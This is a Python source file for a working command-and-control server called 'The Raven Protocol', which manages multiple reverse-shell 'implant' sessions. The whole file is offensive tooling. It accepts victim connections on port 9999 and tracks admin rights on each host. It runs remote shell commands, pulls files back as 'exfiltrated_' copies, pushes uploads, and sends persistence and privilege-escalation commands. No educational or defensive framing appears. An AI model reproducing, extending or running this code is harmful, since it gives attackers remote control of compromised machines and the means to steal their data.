import socket
import threading
import os
import sys
import time

# --- UI COLORS ---
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

current_mode = "CHAT"
is_target_admin = False
active_conn = None
client_cwd = ""       
client_os = "UNKNOWN"
state_lock = threading.Lock()

# --- MULTI-SESSION STORAGE MANAGEMENT ---
sessions = {}          
next_session_id = 1    
current_session_id = None

# Synchronization flags to fix the prompt timing race condition
waiting_for_cwd = False
cwd_updated_event = threading.Event()

BANNER = r"""{PURPLE}{BOLD}
  ██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗
  ██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║
  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║
  ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
  ██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
  ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝

       >> THE RAVEN PROTOCOL v6.0 <<
       Status: Multi-Implant Multiplexing Mode
       Operator: Jon Bytyqi{RESET}
""".format(PURPLE=PURPLE, BOLD=BOLD, RESET=RESET)

def send_packet(conn, msg_type, payload):
    try:
        encoded_payload = payload.encode('utf-8', errors='replace')
        length = len(encoded_payload)
        header = f"{msg_type}:{length}:".encode('utf-8')
        conn.sendall(header + encoded_payload)
    except Exception:
        pass

def read_exact(conn, num_bytes):
    data = b''
    while len(data) < num_bytes:
        try:
            packet = conn.recv(num_bytes - len(data))
            if not packet: return None
            data += packet
        except socket.error: return None
    return data

def receive_packet(conn):
    try:
        type_buffer = b''
        while b':' not in type_buffer:
            chunk = conn.recv(1)
            if not chunk: return None, None
            type_buffer += chunk
        msg_type = type_buffer[:-1].decode('utf-8', errors='ignore')

        len_buffer = b''
        while b':' not in len_buffer:
            chunk = conn.recv(1)
            if not chunk: return None, None
            len_buffer += chunk
        msg_len = int(len_buffer[:-1].decode('utf-8', errors='ignore'))

        payload_bytes = read_exact(conn, msg_len)
        if payload_bytes is None: return None, None
        return msg_type, payload_bytes.decode('utf-8', errors='replace')
    except Exception:
        return None, None

def make_prompt():
    global current_mode, is_target_admin, client_cwd, current_session_id
    with state_lock:
        if current_session_id is None:
            return f"{BOLD}{BLUE}RAVEN-NEST > {RESET}"
            
        display_mode = "ADMIN" if (current_mode == "SHELL" and is_target_admin) else current_mode
        color = RED if current_mode == 'SHELL' else BLUE
        
        prefix = f"RAVEN-{display_mode} [ID:{current_session_id}]"
        if current_mode == "SHELL" and client_cwd:
            return f"{BOLD}{color}{prefix} [{client_cwd}] > {RESET}"
        return f"{BOLD}{color}{prefix} > {RESET}"

def receive_messages(conn, session_id):
    global current_mode, active_conn, client_cwd, waiting_for_cwd, current_session_id, is_target_admin, client_os
    while True:
        msg_type, payload = receive_packet(conn)
        if msg_type is None:
            print(f"\n{RED}[!] Session ID {session_id} beacon lost.{RESET}")
            with state_lock:
                if session_id in sessions:
                    del sessions[session_id]
                if current_session_id == session_id:
                    current_session_id = None
                    active_conn = None
                    client_cwd = ""
                    is_target_admin = False
                    client_os = "UNKNOWN"
            print(make_prompt(), end="", flush=True)
            break
        
        if msg_type == "CWD_UPDATE":
            with state_lock:
                if session_id in sessions:
                    sessions[session_id]["cwd"] = payload
                if current_session_id == session_id:
                    client_cwd = payload
            cwd_updated_event.set()
            if current_session_id == session_id and not waiting_for_cwd:
                print(f"\r{make_prompt()}", end="", flush=True)
            continue

        if current_session_id == session_id:
            if msg_type == "FILE_DATA" and ":" in payload:
                filename, hex_content = payload.split(":", 1)
                try:
                    out_filename = f"exfiltrated_{os.path.basename(filename)}"
                    # Binary mode write with hex decoding to prevent file layout corruption
                    with open(out_filename, "wb") as f:
                        f.write(bytes.fromhex(hex_content))
                    print(f"\n{GREEN}[+] Saved file down locally as {out_filename}{RESET}")
                except Exception as e:
                    print(f"\n{RED}[!] Local file write failure: {e}{RESET}")
                print(f"\r{make_prompt()}", end="", flush=True)
            elif msg_type == "SHELL_OUT":
                if payload.strip():
                    print(f"\n{payload.strip()}")
                time.sleep(0.05)  # Let text flush entirely before rendering next main input cursor
            elif msg_type == "CHAT_MSG":
                print(f"\n{GREEN}[MSG]{RESET}: {payload}")
                print(f"\r{make_prompt()}", end="", flush=True)
            elif msg_type == "STATUS":
                print(f"\n{YELLOW}[STATUS]{RESET}: {payload}")
                print(f"\r{make_prompt()}", end="", flush=True)

def connection_listener(server):
    global active_conn, is_target_admin, current_mode, client_os, client_cwd, next_session_id, current_session_id
    while True:
        try:
            conn, addr = server.accept()
            
            # Enable TCP Keepalive parameters on newly accepted connection object
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if hasattr(socket, "TCP_KEEPIDLE"):
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
                
            msg_type, initial_id = receive_packet(conn)
            if not initial_id: continue
            
            tgt_admin = "ADMIN" in initial_id
            tgt_os = "WINDOWS" if "Windows" in initial_id else "LINUX"
            tgt_cwd = ""
            if "||CWD:" in initial_id:
                tgt_cwd = initial_id.split("||CWD:")[1]
            
            with state_lock:
                assigned_id = next_session_id
                sessions[assigned_id] = {
                    "conn": conn,
                    "os": tgt_os,
                    "admin": tgt_admin,
                    "cwd": tgt_cwd,
                    "addr": addr
                }
                next_session_id += 1
                
                if current_session_id is None:
                    current_session_id = assigned_id
                    active_conn = conn
                    is_target_admin = tgt_admin
                    client_os = tgt_os
                    client_cwd = tgt_cwd

            print(f"\n{RED}[!] Inbound connection received: {addr[0]} [ID: {assigned_id}] [{tgt_os}]{RESET}")
            threading.Thread(target=receive_messages, args=(conn, assigned_id), daemon=True).start()
            send_packet(conn, "CMD", "PWD_REQ")
            print(make_prompt(), end="", flush=True)
        except Exception: break

def start_raven_nest():
    """Starts the primary server processing framework and loop sequence."""
    global current_mode, active_conn, waiting_for_cwd, current_session_id, client_cwd, is_target_admin, client_os
    os.system('') 
    print(BANNER)
    target_ip = input(f"{YELLOW}Enter Listening IP (Default 0.0.0.0): {RESET}") or "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: 
        server.bind((target_ip, 9999))
    except Exception as e:
        print(f"{RED}[!] Bind failure: {e}{RESET}")
        sys.exit(1)
        
    server.listen(5)
    print(f"{YELLOW}[*] Server initialization stable. Listening on port 9999...{RESET}")
    threading.Thread(target=connection_listener, args=(server,), daemon=True).start()

    while True:
        prompt_str = make_prompt()
        try: 
            msg = input(prompt_str).strip()
        except (KeyboardInterrupt, EOFError): 
            os._exit(0)
        if not msg: 
            continue
        if msg.lower() == "exit": 
            os._exit(0)
            
        if msg.lower() == "help":
            print(f"\n{YELLOW}── RAVEN INTERNAL PLATFORM EXTENSION MACROS ──{RESET}")
            print(f" * {WHITE}sessions{RESET}               - List all background multi-implant routing lanes.")
            print(f" * {WHITE}interact <id>{RESET}           - Shift interactive focus to specific session.")
            print(f" * {WHITE}survey{RESET}                 - Run multi-threaded configuration forensics.")
            print(f" * {WHITE}download <remote-path>{RESET}  - Transfer remote file asset back to server.")
            print(f" * {WHITE}upload <local-path>{RESET}    - Push local asset down to target workspace.")
            print(f" * {WHITE}persist{RESET}                 - Deploy persistence configuration matrix.")
            print(f" * {WHITE}elevate{RESET}                 - Request high privilege execution context validation.")
            print(f" * {WHITE}clear / cls{RESET}             - Clear local terminal console screens.")
            print(f" * {WHITE}shell / chat{RESET}            - Transition processing routing contexts.")
            print()
            continue

        if msg.lower() == "sessions":
            print(f"\n{YELLOW}── ACTIVE IMPLANT ROUTING LANES ──{RESET}")
            if not sessions:
                print("No active target sessions registered.")
            else:
                for sid, info in sessions.items():
                    focus_marker = f"{GREEN}* {RESET}" if sid == current_session_id else "  "
                    priv_str = "ADMIN" if info["admin"] else "USER"
                    print(f"{focus_marker}ID: {sid} | Remote: {info['addr'][0]} | OS: {info['os']} ({priv_str}) | Path: {info['cwd']}")
            print()
            continue

        if msg.lower().startswith("interact "):
            try:
                target_sid = int(msg[9:].strip())
                if target_sid in sessions:
                    with state_lock:
                        current_session_id = target_sid
                        active_conn = sessions[target_sid]["conn"]
                        client_os = sessions[target_sid]["os"]
                        is_target_admin = sessions[target_sid]["admin"]
                        client_cwd = sessions[target_sid]["cwd"]
                    print(f"{GREEN}[+] Interacting with session {target_sid}{RESET}")
                    # Force immediate context update
                    cwd_updated_event.clear()
                    waiting_for_cwd = True
                    send_packet(active_conn, "CMD", "PWD_REQ")
                    cwd_updated_event.wait(timeout=0.3)
                    waiting_for_cwd = False
                else:
                    print(f"{RED}[!] Session ID {target_sid} does not exist.{RESET}")
            except ValueError:
                print(f"{RED}[!] Usage: interact <session_id>{RESET}")
            continue

        if msg.lower() == "shell":
            with state_lock: 
                current_mode = "SHELL"
            if active_conn: 
                cwd_updated_event.clear()
                waiting_for_cwd = True
                send_packet(active_conn, "CMD", "PWD_REQ")
                cwd_updated_event.wait(timeout=0.5)
                waiting_for_cwd = False
            continue
        if msg.lower() == "chat":
            with state_lock: 
                current_mode = "CHAT"
            continue
        if msg.lower() in ["clear", "cls"]:
            os.system('cls' if os.name == 'nt' else 'clear')
            continue

        if not active_conn:
            print(f"{YELLOW}[!] No session active. Type 'sessions' and 'interact <id>' to begin.{RESET}")
            continue

        cmd_tokens = msg.split()
        is_cd_cmd = cmd_tokens[0].lower() == "cd" and current_mode == "SHELL"

        if cmd_tokens[0].lower() in ["persist", "elevate", "survey"]:
            send_packet(active_conn, "CMD", msg)
            time.sleep(0.1)
            continue
            
        if msg.lower().startswith("download "):
            send_packet(active_conn, "CMD", msg)
            time.sleep(0.1)
            continue

        if msg.lower().startswith("upload "):
            filename = msg[7:].strip()
            if os.path.exists(filename):
                try:
                    # Binary read + hex transfer to support arbitrary format models safely
                    with open(filename, "rb") as f: 
                        data = f.read().hex()
                    send_packet(active_conn, "UPLOAD", f"{os.path.basename(filename)}:{data}")
                except Exception as e: 
                    print(f"\n{RED}[!] Upload fail: {e}{RESET}")
            else: 
                print(f"{RED}[!] Local resource file not found.")
            time.sleep(0.1)
            continue

        if is_cd_cmd:
            cwd_updated_event.clear()
            waiting_for_cwd = True
            send_packet(active_conn, "CMD", msg)
            cwd_updated_event.wait(timeout=0.5)
            waiting_for_cwd = False
        else:
            send_packet(active_conn, "CMD" if current_mode == "SHELL" else "CHAT", msg)
            time.sleep(0.1)

if __name__ == "__main__":
    start_raven_nest()